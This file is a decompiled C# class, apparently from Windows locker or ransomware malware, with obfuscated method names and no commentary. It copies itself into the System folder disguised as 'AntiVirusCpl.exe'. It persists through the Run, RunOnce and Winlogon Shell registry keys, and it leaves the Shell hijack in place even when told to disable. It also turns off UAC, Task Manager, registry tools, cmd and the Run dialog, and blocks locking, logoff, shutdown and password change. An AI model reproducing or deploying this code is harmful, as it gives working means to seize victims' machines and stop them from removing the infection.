using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns2;

internal class Class6
{
	public static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\AntiVirusCpl.exe";

	public static void smethod_0(bool bool_0)
	{
		if (!File.Exists(string_0))
		{
			File.Copy(Application.get_ExecutablePath(), string_0, overwrite: true);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true);
		RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
		if (bool_0)
		{
			registryKey.SetValue("AntiVirusCpl", string_0);
			registryKey2.SetValue("AntiVirusCpl", string_0);
			registryKey3.SetValue("AntiVirusCpl", string_0);
			registryKey4.SetValue("Shell", string_0);
		}
		else
		{
			registryKey.DeleteValue("AntiVirusCpl", throwOnMissingValue: false);
			registryKey2.DeleteValue("AntiVirusCpl", throwOnMissingValue: false);
			registryKey3.DeleteValue("AntiVirusCpl", throwOnMissingValue: false);
			registryKey4.SetValue("Shell", string_0);
		}
		registryKey.Close();
		registryKey2.Close();
		registryKey3.Close();
		registryKey4.Close();
	}

	public static void smethod_1()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
		registryKey.Close();
	}

	public static void smethod_2(bool bool_0)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		if (bool_0)
		{
			registryKey.SetValue("DisableTaskMgr", 1);
			registryKey2.SetValue("DisableTaskMgr", 1);
		}
		else
		{
			registryKey.SetValue("DisableTaskMgr", 0);
			registryKey2.SetValue("DisableTaskMgr", 0);
		}
		registryKey.Close();
	}

	public static void smethod_3(bool bool_0)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		if (bool_0)
		{
			registryKey.SetValue("DisableRegistryTools", 1);
			registryKey2.SetValue("DisableRegistryTools", 1);
		}
		else
		{
			registryKey.SetValue("DisableRegistryTools", 0);
			registryKey2.SetValue("DisableRegistryTools", 0);
		}
		registryKey.Close();
	}

	public static void smethod_4(bool bool_0)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		if (bool_0)
		{
			registryKey.SetValue("NoRun", 1);
			registryKey.SetValue("NoViewContextMenu", 1);
			registryKey2.SetValue("DisableCMD", 1);
			registryKey3.SetValue("NoRun", 1);
			registryKey3.SetValue("NoViewContextMenu", 1);
			registryKey4.SetValue("DisableCMD", 1);
		}
		else
		{
			registryKey.SetValue("NoRun", 0);
			registryKey.SetValue("NoViewContextMenu", 0);
			registryKey2.SetValue("DisableCMD", 0);
			registryKey3.SetValue("NoRun", 0);
			registryKey3.SetValue("NoViewContextMenu", 0);
			registryKey4.SetValue("DisableCMD", 0);
		}
		registryKey.Close();
	}

	public static void smethod_5(bool bool_0)
	{
		if (bool_0)
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableLockWorkstation", 1);
			registryKey.SetValue("DisableChangePassword", 1);
			registryKey.Close();
			registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
			registryKey.SetValue("NoLogoff", 1);
			registryKey.SetValue("NoClose", 1);
			registryKey.Close();
			registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("HideFastUserSwitching", 1);
			registryKey.Close();
			return;
		}
		try
		{
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.DeleteValue("DisableLockWorkstation", throwOnMissingValue: false);
			registryKey2.DeleteValue("DisableChangePassword", throwOnMissingValue: false);
			registryKey2.Close();
			registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
			registryKey2.DeleteValue("NoLogoff", throwOnMissingValue: false);
			registryKey2.DeleteValue("NoClose", throwOnMissingValue: false);
			registryKey2.Close();
			registryKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.DeleteValue("HideFastUserSwitching", throwOnMissingValue: false);
			registryKey2.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
